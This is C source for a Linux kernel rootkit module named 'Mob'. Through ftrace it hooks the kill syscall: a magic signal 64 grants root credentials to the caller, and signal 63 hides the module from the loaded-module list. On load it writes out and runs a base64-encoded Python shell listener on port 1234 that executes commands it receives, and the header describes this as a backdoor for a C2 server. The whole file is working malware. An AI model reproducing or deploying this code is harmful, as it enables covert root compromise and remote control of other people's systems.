/*
Linux Kernel Rootkit:
    -   Use the Makefile to build the module.
    -   ftracer.h is a helping module which is basically trying to override the system calls. (Author: xcellerator)
    -   Hide and Unhide itself from modules lists.
    -   Granting root permissions by updating root credentials.
    -   Creating and executing the reverse shell/backdoor which can be used to connect to a C2 server.

    eg-> reverse shell payload (base64 encoded): IyMjIyMjIyMjIyMjIyMjIyMjCiMgU2Vjb25kIFZlcnNpb24gIwojIyMjIyMjIyMjIyMjIyMjIyMKCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKCmltcG9ydCBvcwoKSE9TVCA9ICcwLjAuMC4wJwpQT1JUID0gMTIzNAoKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5iaW5kKChIT1NULCBQT1JUKSkKcy5saXN0ZW4oMSkKcHJpbnQoIkxpc3RlbmluZyBvbiBwb3J0IDEyMzQiKQoKd2hpbGUgVHJ1ZToKICAgIGNvbm4sIGFkZHIgPSBzLmFjY2VwdCgpCiAgICBwcmludCgiQ29ubmVjdGlvbiBBY2NlcHRlZCBmcm9tOiB7fSIuZm9ybWF0KGFkZHIpKQogICAgZGF0YSA9IGNvbm4ucmVjdigxMDI0KS5kZWNvZGUoJ3V0Zi04JykKICAgIHRyeToKICAgICAgICBpZiBkYXRhOgogICAgICAgICAgICAjIEV4ZWN1dGUgdGhlIGNvbW1hbmQgYW5kIHNlbmQgYmFjayB0aGUgcmVzdWx0CiAgICAgICAgICAgICMgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoZGF0YS5zcGxpdCgpLCBzaGVsbD1UcnVlKQogICAgICAgICAgICBwcyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICByZXN1bHQgPSBwcy5jb21tdW5pY2F0ZSgpWzBdICsgc3RyKCc7IHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBpZCgpKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIoJzsgcHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBwaWQoKSkuZW5jb2RlKCd1dGYtOCcpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJlc3VsdCA9IHN0cihlKS5lbmNvZGUoJ3V0Zi04JykKCiAgICBjb25uLnNlbmQocmVzdWx0KQogICAgY29ubi5jbG9zZSgpCg==

Author: shv-om
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>

#include <linux/kmod.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/fcntl.h>
#include <linux/uaccess.h>
#include <linux/sched/signal.h>
#include <linux/pid.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Mob");
MODULE_DESCRIPTION("Mob Rootkit");
MODULE_VERSION("0.01");


/* 
 * After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familiar function
 * prototype declaration.
*/

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* Need to hide/reveal the kernel module*/
static struct list_head *prev_module;
static short hidden = 0;


#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* Modern versions using pt_regs struct to store arguments and them pass the struct itself*/
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    void unhide(void);
    void hidenow(void);

    int sig = regs->si;

    if (sig == 64){
        printk(KERN_INFO "mob: giving root...\n");
        set_root();

        return 0;
    }

    else if ((sig == 63) && (hidden == 0)){
        printk(KERN_INFO "mob: Hiding mob...\n");
        hidenow();
        hidden = 1;
    }

    else if ((sig == 63) && (hidden == 1)){
        printk(KERN_INFO "mob: Revealing mob...\n");
        unhide();
        hidden = 0;
    }

    return orig_kill(regs);
    
}

#else
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

// for earlier versions of kernel using classic way of arguments passing
static asmlinkage int hook_kill(pid_t pid, int sig)
{
    void set_root(void);

    void unhide(void);
    void hidenow(void);

    if (sig == 64){
        printk(KERN_INFO "mob: giving root..\n");
        set_root();
        return 0;
    }

    else if ((sig == 63) && (hidden == 0)){
        printk(KERN_INFO "mob: Hiding mob...\n");
        hidenow();
        hidden = 1;
    }

    else if ((sig == 63) && (hidden == 1)){
        printk(KERN_INFO "mob: Revealing mob...\n");
        unhide();
        hidden = 0;
    }

    return orig_kill(pid, sig);
}
#endif


/* Adding back the kernel module to the loaded module list...*/
void unhide(void){
    list_add(&THIS_MODULE->list, prev_module);
}

/* Removing the kernel module name from he loaded module list to hide the exstence... */
void hidenow(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}


/* Setting credentials to provide root access to the module */
void set_root(void){

    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}


static int get_rev_shell(void){

    char *argv[] = { "/bin/bash", "-c", "echo 'IyMjIyMjIyMjIyMjIyMjIyMjCiMgU2Vjb25kIFZlcnNpb24gIwojIyMjIyMjIyMjIyMjIyMjIyMKCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKCmltcG9ydCBvcwoKSE9TVCA9ICcwLjAuMC4wJwpQT1JUID0gMTIzNAoKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5iaW5kKChIT1NULCBQT1JUKSkKcy5saXN0ZW4oMSkKcHJpbnQoIkxpc3RlbmluZyBvbiBwb3J0IDEyMzQiKQoKd2hpbGUgVHJ1ZToKICAgIGNvbm4sIGFkZHIgPSBzLmFjY2VwdCgpCiAgICBwcmludCgiQ29ubmVjdGlvbiBBY2NlcHRlZCBmcm9tOiB7fSIuZm9ybWF0KGFkZHIpKQogICAgZGF0YSA9IGNvbm4ucmVjdigxMDI0KS5kZWNvZGUoJ3V0Zi04JykKICAgIHRyeToKICAgICAgICBpZiBkYXRhOgogICAgICAgICAgICAjIEV4ZWN1dGUgdGhlIGNvbW1hbmQgYW5kIHNlbmQgYmFjayB0aGUgcmVzdWx0CiAgICAgICAgICAgICMgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoZGF0YS5zcGxpdCgpLCBzaGVsbD1UcnVlKQogICAgICAgICAgICBwcyA9IHN1YnByb2Nlc3MuUG9wZW4oZGF0YSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICByZXN1bHQgPSBwcy5jb21tdW5pY2F0ZSgpWzBdICsgc3RyKCc7IHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBpZCgpKS5lbmNvZGUoJ3V0Zi04JykgKyBzdHIoJzsgcHBpZDogJykuZW5jb2RlKCd1dGYtOCcpICsgc3RyKG9zLmdldHBwaWQoKSkuZW5jb2RlKCd1dGYtOCcpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJlc3VsdCA9IHN0cihlKS5lbmNvZGUoJ3V0Zi04JykKCiAgICBjb25uLnNlbmQocmVzdWx0KQogICAgY29ubi5jbG9zZSgpCg==' | base64 -d > /tmp/payloads.py && python3 /tmp/payloads.py", NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
        NULL
    };
    int ret;

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret < 0) {
        pr_err("Failed to convert base64 string to file: %d\n", ret);
        return ret;
    }

    return 0;
}


static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
};

static int __init mob_init(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "mob: loaded\n");
    
    get_rev_shell();    // Getting reverse shell
    printk(KERN_INFO "mob: Getting reverse shell\n");

    return 0;
}

static void __exit mob_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "mob: unloaded\n");
}

module_init(mob_init);
module_exit(mob_exit);